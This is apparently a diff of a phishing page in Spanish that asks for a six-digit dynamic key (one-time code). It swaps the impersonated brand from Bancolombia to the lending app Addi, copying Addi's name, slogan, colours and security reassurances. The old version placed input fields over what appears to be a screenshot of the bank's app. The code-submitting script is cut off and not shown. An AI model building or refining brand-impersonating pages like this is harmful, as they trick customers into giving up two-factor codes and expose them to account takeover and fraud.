@@ -3,119 +3,245 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clave Dinámica - Bancolombia</title>
+    <title>Clave Dinámica - Addi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
         }
         body, html {
             height: 100%;
             width: 100%;
-            background-color: #f0f0f0;
+            background: #ffffff;
+            color: #1f1f1f;
             overflow: hidden;
         }
-        .image-container {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            position: relative;
+
+        .container {
+            max-width: 700px;
+            margin: auto;
+            padding: 20px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
-        .image-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+
+        .logo {
+            font-size: 45px;
+            font-weight: 700;
+            color: #2F6BFF;
+            margin-bottom: 25px;
         }
-        
-        /* Texto "Ingrese Clave Dinámica" */
-        .title-text {
-            position: absolute;
-            top: 45%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
+
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 12px;
             text-align: center;
-            text-shadow: 1px 1px 3px rgba(0,0,0,0.7);
-            width: 100%;
         }
-        
+
+        p {
+            font-size: 14px;
+            color: #4b4b4b;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .icon-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #4b4b4b;
+        }
+
+        .icon-text span.emoji {
+            font-size: 16px;
+        }
+
         /* Contenedor de las 6 rayitas */
         .center-box {
-            position: absolute;
-            top: 55%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgb(255, 255, 255);
-            width: 290px;
-            height: 66px;
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 400px;
+            height: 80px;
             display: flex;
             justify-content: center;
             align-items: center;
-            border-radius: 8px;
+            border-radius: 12px;
+            margin: 40px auto 20px auto;
+            border: 2px solid #e0e0e0;
+            transition: border-color 0.3s ease;
+        }
+
+        .center-box:focus-within {
+            border-color: #3B63FF;
         }
         
         .digits-container {
             display: flex;
-            gap: 8px;
+            gap: 12px;
             width: 80%;
             justify-content: center;
         }
         
         .digit-input {
-            width: 35px;
-            height: 45px;
+            width: 45px;
+            height: 55px;
             border: none;
-            border-bottom: 2px solid #ffe100;
+            border-bottom: 3px solid #e0e0e0;
             text-align: center;
             font-size: 24px;
-            font-weight: bold;
+            font-weight: 600;
             outline: none;
             background: transparent;
+            transition: border-color 0.3s ease;
+            color: #1f1f1f;
         }
         
         .digit-input:focus {
-            border-bottom: 2px solid #210049;
+            border-bottom: 3px solid #3B63FF;
         }
         
+        /* BOTONES */
         .button-container {
-            position: absolute;
-            top: 70.4%;
-            left: 50%;
-            transform: translate(-50%, -50%);
             display: flex;
-            gap: 10px;
+            gap: 15px;
+            width: 90%;
+            max-width: 400px;
+            margin: 30px auto;
         }
         
         .button-container button {
-            padding: 13px 35px;
-            font-size: 13px;
+            flex: 1;
+            padding: 15px;
+            font-size: 16px;
             border: none;
-            border-radius: 50px;
-            font-weight: bold;
+            border-radius: 40px;
+            font-weight: 600;
             cursor: pointer;
+            transition: background-color 0.3s ease;
         }
         
         .button-container button:first-child {
-            background-color: #ffffff;
-            border: 1px solid black;
+            background-color: #f5f5f5;
+            color: #333;
+            border: 2px solid #e0e0e0;
+        }
+        
+        .button-container button:first-child:hover {
+            background-color: #e8e8e8;
         }
         
         .button-container button:last-child {
-            background-color: #ffda37;
-            color: black;
+            background-color: #3B63FF;
+            color: white;
+        }
+
+        .button-container button:last-child:hover {
+            background-color: #2F6BFF;
+        }
+
+        footer {
+            font-size: 11px;
+            margin-top: auto;
+            margin-bottom: 20px;
+            color: #7a7a7a;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        .security-info {
+            background: #f8f9ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px auto;
+            width: 90%;
+            max-width: 400px;
+            border-left: 4px solid #3B63FF;
+        }
+
+        .security-title {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #1f1f1f;
+        }
+
+        .security-text {
+            font-size: 12px;
+            color: #4b4b4b;
+            line-height: 1.4;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 40px;
+            }
+
+            h1 {
+                font-size: 18px;
+            }
+
+            p {
+                font-size: 13px;
+            }
+
+            .icon-text {
+                font-size: 11px;
+            }
+
+            .center-box {
+                width: 95%;
+                height: 70px;
+            }
+
+            .digit-input {
+                width: 35px;
+                height: 45px;
+                font-size: 20px;
+            }
+
+            .button-container {
+                width: 95%;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .container {
+                margin-top: 40px;
+            }
+
+            .logo {
+                font-size: 55px;
+            }
+
+            h1 {
+                font-size: 22px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="img/cel11.jpg" alt="Background Image">
+    <div class="container">
+        <div class="logo">Addi</div>
+
+        <h1>Ingrese su Clave Dinámica</h1>
         
-        <!-- Texto "Ingrese Clave Dinámica" -->
-        <div class="title-text"></div>
-        
+        <p>Por favor ingrese el código de 6 dígitos que recibió en su dispositivo autorizado</p>
+
+        <div class="icon-text">
+            <span class="emoji">🔒</span>
+            <span>Su transacción está protegida con autenticación de dos factores</span>
+        </div>
+
         <!-- Contenedor de las 6 rayitas -->
         <div class="center-box">
             <div class="digits-container">
@@ -127,11 +253,21 @@
                 <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
             </div>
         </div>
+
+        <div class="security-info">
+            <div class="security-title">🛡️ Verificación de Seguridad</div>
+            <p class="security-text">Este código expira en 10 minutos. No comparta este código con nadie.</p>
+        </div>
         
         <div class="button-container">
             <button onclick="window.history.back()">Cancelar</button>
             <button id="loginButton">Ingresar</button>
         </div>
+
+        <footer>
+            Addi - Compra a cuotas lo que quieres<br>
+            <span style="color:#3B63FF;">Términos y condiciones</span> | <span style="color:#3B63FF;">Políticas de privacidad</span>
+        </footer>
     </div>
 
     <script>
